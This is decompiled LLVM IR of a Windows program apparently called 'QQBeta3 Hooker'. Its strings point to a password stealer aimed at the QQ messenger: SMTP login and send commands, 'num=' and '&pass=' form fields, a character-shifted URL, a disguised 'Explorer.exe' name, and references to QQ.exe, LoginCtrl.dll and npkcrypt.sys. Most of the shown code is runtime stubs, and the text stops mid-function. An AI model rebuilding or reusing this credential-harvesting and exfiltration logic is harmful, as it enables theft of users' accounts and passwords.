source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404c5c = local_unnamed_addr constant i32 43
@global_var_404c74 = constant i32 37
@global_var_404cfc = local_unnamed_addr constant i32 63
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_404dc0 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404dc4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_404de0 = constant [10 x i8] c"First Run\00"
@global_var_404e9c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404eb8 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_404f64 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f74 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405238 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4215688
@B64EncodeTable_at_405388 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a60 = constant [6 x i8] c"HELO \00"
@global_var_405a70 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a7c = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a94 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405aac = constant i32 62
@global_var_405ab8 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405acc = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405adc = constant [8 x i8] c"From: <\00"
@global_var_405aec = constant [6 x i8] c"To: <\00"
@global_var_405afc = constant [10 x i8] c"Subject: \00"
@global_var_405b10 = constant i32 46
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_405b1c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_405b66 = local_unnamed_addr constant i32 763609949
@global_var_405c88 = constant [7 x i8] c"#32770\00"
@global_var_405c98 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_405ce4 = local_unnamed_addr constant i32 4218088
@global_var_405ce8 = local_unnamed_addr constant i32 841875985
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4218380
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406008 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406320 = constant [6 x i8] c"Down(\00"
@global_var_406330 = constant i32 41
@global_var_40633c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406340 = constant [5 x i8] c"Open\00"
@global_var_4096d0 = global i32 0
@global_var_406604 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_406610 = constant i32 47
@global_var_406650 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_40665c = constant [5 x i8] c"num=\00"
@global_var_40666c = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_40667c = local_unnamed_addr constant [35 x i8] c"iuuq;00uftu=43992=dpn0uftu0ofx=btq\00"
@global_var_406754 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406764 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406874 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406884 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_40688c = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406b00 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406b14 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406b20 = local_unnamed_addr constant i32 47
@global_var_40690c = local_unnamed_addr constant i32 4221200
@global_var_406910 = local_unnamed_addr constant i32 841875985
@global_var_406c40 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406c54 = constant i32 47
@global_var_406c60 = constant [3 x i8] c"\0D\0A\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_407238 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_4072e4 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_40746c = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_407478 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_4096f0 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_407958 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_40797c = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_407a10 = constant [11 x i8] c"user32.dll\00"
@global_var_407a1c = constant [11 x i8] c"LoadImageA\00"
@global_var_407a28 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407608 = local_unnamed_addr constant i32 4224596
@global_var_407654 = local_unnamed_addr constant i32 1867011080
@global_var_407a38 = constant [12 x i8] c"LoadStringA\00"
@global_var_407a44 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_407a50 = constant [12 x i8] c"shell32.dll\00"
@global_var_407a5c = constant [14 x i8] c"ShellExecuteA\00"
@global_var_407a6c = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_40810d = local_unnamed_addr global i32 0
@global_var_4096f4 = local_unnamed_addr global i32 0
@global_var_4096f8 = local_unnamed_addr global i32 0
@global_var_407b40 = local_unnamed_addr constant i32 31
@global_var_409808 = local_unnamed_addr global i32 0
@global_var_407ee8 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_407ef8 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407f10 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407f28 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407f38 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407f48 = constant [8 x i8] c"ListBox\00"
@global_var_40980c = global i32 0
@global_var_407f58 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096fc = external global i8*

declare i32 @unknown_4855() local_unnamed_addr

declare i32 @unknown_489a() local_unnamed_addr

declare i32 @unknown_48de() local_unnamed_addr

declare i32 @unknown_49a9() local_unnamed_addr

declare i32 @unknown_4e40() local_unnamed_addr

declare i32 @unknown_4f18() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
